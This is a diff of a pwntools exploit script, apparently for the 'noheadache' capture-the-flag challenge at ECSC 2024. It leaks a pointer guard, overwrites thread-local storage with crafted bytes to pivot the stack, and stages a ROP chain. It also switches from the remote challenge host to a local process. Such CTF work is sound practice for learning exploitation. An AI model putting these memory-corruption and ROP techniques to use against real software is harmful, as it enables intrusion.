@@ -117,29 +117,26 @@ def get_leaks():
     log.info(f'LOCAL_GUARD is {hex(local_guard)}')
 
 
-def reverse_byte_string(byte_string):
-    return byte_string[::-1]
 
-
-#tls_content should start from tls-0x80
 def overwrite(padding, content):
     content_len = len(content)
 
     splitted = content.split(b'\x00')
     split_len = len(splitted)
 
+    # Can't write more then 4096 bytes
+    assert(padding + content_len < 0xfff)
+
     for _ in range(len(splitted)):
         curr = splitted.pop()
-        # Can't write more then 4096 bytes
-        assert(padding + content_len < 0xfff)
 
         set_content(curr.rjust((padding + content_len), b'\x41'))
         content_len -= (len(curr) + 1)
 
     
 
-io = remote('noheadache.challs.open.ecsc2024.it', 38004)
-# io = start()
+# io = remote('noheadache.challs.open.ecsc2024.it', 38004)
+io = start()
 
 # mmap_base
 new()
@@ -163,12 +160,9 @@ last_alloc_ctx = mmap_base + 0x1e30 + 16
 
 # tls content should start from tls-0x80
 tls_content = b'\xff' * 8 * 5
-tls_content += p64(last_alloc_ctx + 0x60) # second qword of the last allocated
-# tls_content += p64(tls_base - 0x80 + 0x38) # <-- rbp
+tls_content += p64(last_alloc_ctx + 0x60) # -- rbp
 tls_content += b'A' * 16
-# tls_content += p64(PTR_MANGLE(local_guard, rop.leave))
 tls_content += b'\xff' * 8
-# tls_content += 
 overwrite(PAD_TO_TLS, tls_content)
 
 # write ROP inside content of last chunk
